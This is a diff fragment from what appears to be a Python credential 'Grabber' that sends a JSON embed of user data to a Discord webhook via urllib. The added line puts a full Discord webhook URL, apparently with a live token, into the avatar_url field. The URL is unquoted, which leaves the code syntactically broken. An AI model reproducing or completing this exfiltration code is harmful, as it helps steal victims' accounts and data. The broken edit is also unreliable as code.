@@ -199,7 +199,7 @@ def main():
                         }
                     ],
                     "username": "Grabber",
-                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
+                    "avatar_url": https://discord.com/api/webhooks/1500014566745309305/ZxTPu1qgy7r_mZntBeLGDAqelZAl902DDwOp8GfXaS9g5LbIx3GXfa9kbJBG98ZlxTG3
                 }
 
                 urllib.request.urlopen(urllib.request.Request('WEBHOOK_URL', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
